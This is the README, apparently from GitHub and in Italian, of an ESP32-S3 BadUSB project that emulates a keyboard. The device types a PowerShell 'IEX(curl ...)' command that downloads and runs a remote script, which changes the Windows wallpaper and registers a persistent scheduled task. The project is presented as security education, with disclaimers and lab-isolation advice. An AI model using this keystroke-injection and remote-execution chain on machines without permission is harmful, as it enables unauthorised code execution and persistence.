# T-Dongle-S3_Desktop_Modifier

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/Platform-ESP32--S3-brightgreen)](https://www.espressif.com/)

> **Security Research & Educational Project** - Proof-of-concept firmware for USB HID attacks and penetration testing

Firmware per **LilyGo T-Dongle-S3** (ESP32-S3) che emula una tastiera USB HID e avvia uno script PowerShell per modificare il desktop di Windows. Questo è un progetto didattico di security research che dimostra le vulnerabilità dei sistemi non protetti da BadUSB attacks.

---

## ⚠️ Legal Disclaimer

**ATTENZIONE: Questo progetto è solo a scopo didattico e di ricerca sulla sicurezza.**

- ✋ **NON** utilizzare su computer che non possiedi o senza **permesso esplicito** del proprietario
- ⚖️ L'uso non autorizzato potrebbe violare leggi sulla sicurezza informatica
- 🔒 Testa **ESCLUSIVAMENTE** in ambienti isolati (VM, sandbox, computer di laboratorio)
- 📋 Usa solo a scopo **educativo e di penetration testing autorizzato**

---

## 📋 Caratteristiche

✅ Emulazione USB HID keyboard (tastiera virtuale)  
✅ Esecuzione automatica di comandi PowerShell  
✅ Download e esecuzione di script remoti  
✅ Modifica dello sfondo desktop di Windows  
✅ EEPROM configuration & persistence  
✅ Codice modulare e facilmente personalizzabile  

---

## 🛠️ Requisiti Hardware

- **LilyGo T-Dongle-S3** (scheda di sviluppo con ESP32-S3)
- Cavo **USB Type-C** (per flashing e alimentazione)
- Computer con **Windows 10/11** (target - per i test)
- Ambiente di test isolato (VM consigliata)

## 📦 Requisiti Software

- **PlatformIO** (estensione VS Code oppure CLI)
- Driver USB per LilyGo T-Dongle-S3
- **Python 3.x** (per eseguire build di PlatformIO)
- **Git** (per clonare il repository)

---

## 📁 Struttura del Repository

```
T-Dongle-S3_Desktop_Modifier/
├── src/
│   └── main.cpp                    # Firmware ESP32-S3 (HID keyboard emulator)
├── scripts/
│   ├── bootstrap.ps1               # Entry point dello script
│   ├── Set-Wallpaper.ps1           # Modifica lo sfondo
│   ├── Register-WallpaperTask.ps1  # Registra task persistente
│   └── ...
├── platformio.ini                  # Configurazione PlatformIO
├── README.md                       # Questo file
└── LICENSE                         # MIT License
```

---

## 🚀 Come Funziona

### Flusso di Esecuzione

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Accendi il T-Dongle-S3 e collegalo via USB                  │
├─────────────────────────────────────────────────────────────────┤
│ 2. Dispositivo viene riconosciuto come tastiera USB             │
├─────────────────────────────────────────────────────────────────┤
│ 3. Firmware emula: Win + R (apre "Esegui")                      │
├─────────────────────────────────────────────────────────────────┤
│ 4. Invia comando PowerShell via tassi virtuali                  │
│    Esempio: powershell -Command "IEX(curl...)"                 │
├─────────────────────────────────────────────────────────────────┤
│ 5. PowerShell scarica bootstrap.ps1 da GitHub                   │
├─────────────────────────────────────────────────────────────────┤
│ 6. Script esegue:                                               │
│    - Set-Wallpaper.ps1 (cambia sfondo)                          │
│    - Register-WallpaperTask.ps1 (rende persistente)             │
└─────────────────────────────────────────────────────────────────┘
```

### Dettagli Tecnici

- Il firmware risiede in `src/main.cpp`
- L'URL del payload PowerShell è definito nella costante `URL`
- Tutti gli script PowerShell sono in `scripts/`
- Per motivi di sicurezza, **DEVI personalizzare l'URL** prima di usare il dispositivo

---

## 🚀 Quick Start

### 1. Clona il Repository

```bash
git clone https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier.git
cd T-Dongle-S3_Desktop_Modifier
```

### 2. Installa PlatformIO

**Via VS Code (consigliato):**
- Installa l'estensione **PlatformIO IDE** dal VS Code Marketplace
- Riavvia VS Code

**Via CLI:**
```bash
pip install platformio
```

### 3. Modifica il Payload (IMPORTANTE!)

Apri `src/main.cpp` e modifica la costante `URL` per puntare al tuo script di test:

```cpp
const char* URL = "https://your-domain.com/your-script.ps1";
```

**Per il testing iniziale**, punta a uno script locale o di test controllato da te.

### 4. Compila il Firmware

**Con VS Code:**
- Clicca su `PlatformIO` nella sidebar
- Seleziona `Build`

**Con CLI:**
```bash
pio run
```

### 5. Carica il Firmware

**Con VS Code:**
- Clicca su `Upload` (con la board collegata via USB)

**Con CLI:**
```bash
pio run -t upload
```

### 6. Testa in Ambiente Isolato

- Usa una **VM Windows** con snapshot attivo
- Disconnetti la rete o usa una VLAN isolata
- Collega il T-Dongle-S3
- Osserva il comportamento

---

## ⚙️ Personalizzazione

### Cambiare il Comando PowerShell

Modifica `src/main.cpp`:

```cpp
const char* URL = "https://your-server.com/your-script.ps1";
const char* COMMAND = "powershell -Command \"IEX(curl -Uri '" + URL + "')\"";
```

### Ospitare Script Localmente

Per test rapidi senza dipendenze Internet:

```bash
# Avvia un web server locale
python -m http.server 8000

# Modifica URL in main.cpp a:
const char* URL = "http://192.168.X.X:8000/bootstrap.ps1";
```

### Aggiungere Delay

Se vuoi aggiungere un delay tra i tasti (utile per sistemi lenti):

```cpp
delay(100);  // Aumenta il delay tra i tasti (in ms)
```

---

## 🔒 Sicurezza e Best Practices

### ✅ Come Testare Sicuramente

1. **Usa una VM Windows**
   ```
   VirtualBox / VMware / Hyper-V
   → Crea uno snapshot prima di testare
   → Puoi ripristinare facilmente se necessario
   ```

2. **Isola la Rete**
   ```
   - Disconnetti la rete della VM
   - Oppure usa una VLAN isolata
   - Oppure usa un firewall locale
   ```

3. **Analizza lo Script PowerShell Prima**
   ```powershell
   # Esegui manualmente lo script per vedere cosa fa
   . .\scripts\bootstrap.ps1
   ```

4. **Usa Antivirus in Test**
   ```
   - Attiva Windows Defender
   - Controlla i log di Windows Event Viewer
   - Monitora le modifiche al sistema
   ```

### ❌ Cosa NON Fare

- Non usare su computer altrui senza permesso esplicito
- Non distribuire il firmware su internet
- Non usare per scopi di intrusione o danno
- Non testare su reti di produzione

---

## 🐛 Troubleshooting

| Problema | Soluzione |
|----------|-----------|
| **Firmware non si carica** | Controlla che il driver USB sia installato; prova PlatformIO CLI |
| **Tastiera non riconosciuta** | Riavvia il sistema o controlla la configurazione USB in platformio.ini |
| **Script PowerShell non esegue** | Verifica che l'URL sia raggiungibile e che PowerShell execution policy lo consenta |
| **Errori di compilazione** | Assicurati che PlatformIO abbia tutti i board manager: `pio boards \| grep esp32-s3` |

---

## 📚 Risorse Utili

- [LilyGo T-Dongle-S3 Documentation](https://github.com/Xinyuan-LilyGO/T-Dongle-S3)
- [ESP32-S3 USB Device Documentation](https://docs.espressif.com/projects/esp-idf/en/latest/)
- [PlatformIO Documentation](https://docs.platformio.org/)
- [USB HID Specification](https://www.usb.org/hid)
- [PowerShell Security Best Practices](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)

---

## 🎓 Concetti Appresi

Questo progetto insegna:

- ✏️ **USB HID Protocol** - Come emulare una tastiera USB
- 💻 **Embedded Systems** - Programmazione ESP32-S3 con PlatformIO
- 🔐 **Security Research** - BadUSB attacks e loro mitigazioni
- 📜 **PowerShell Automation** - Script automation su Windows
- ⚠️ **Responsible Disclosure** - Importanza dell'etica nel security research

---

## 📝 Licenza

Questo repository è rilasciato sotto licenza **MIT**.  
Vedi il file [LICENSE](LICENSE) per i dettagli completi.

---

## 💬 Supporto e Domande

- 📧 **Issues**: Apri un [issue su GitHub](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/issues) per bug reports
- 💡 **Discussions**: Usa [GitHub Discussions](https://github.com/Gory-git/T-Dongle-S3_Desktop_Modifier/discussions) per domande generali
- 🔒 **Security**: Se trovi vulnerabilità, contattami direttamente anziché aprire issue pubblici

